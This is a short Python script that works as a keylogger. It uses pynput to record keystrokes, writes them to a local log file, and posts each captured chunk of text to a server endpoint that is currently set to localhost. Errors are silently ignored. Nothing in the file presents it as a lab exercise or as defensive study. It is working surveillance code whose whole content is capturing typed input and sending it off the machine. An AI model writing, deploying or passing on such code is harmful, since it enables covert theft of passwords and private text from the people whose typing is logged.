import requests
from typing import List
from pynput.keyboard import Key, Listener

API_URL = "http://127.0.0.1:8000/receive_logs" 
saved_keys = []

def send_to_server(content: str):
    try:
        requests.post(API_URL, data={"log_data": content})
    except:
        pass

def write_to_file(keys: List):
    content = ""
    for key in keys:
        k = str(key).replace("'", "")
        if "key".upper() not in k.upper():
            content += k
    if content:
        with open("log.txt", "a") as file:
            file.write(content + "\n")
        send_to_server(content)

def on_key_release(key):
    global saved_keys
    if key == Key.esc:
        return False
    if key == Key.enter or key == Key.space:
        if key == Key.space:
            saved_keys.append(" ")
        write_to_file(saved_keys)
        saved_keys = []
    else:
        saved_keys.append(key)

with Listener(on_release=on_key_release) as listener:
    listener.join()
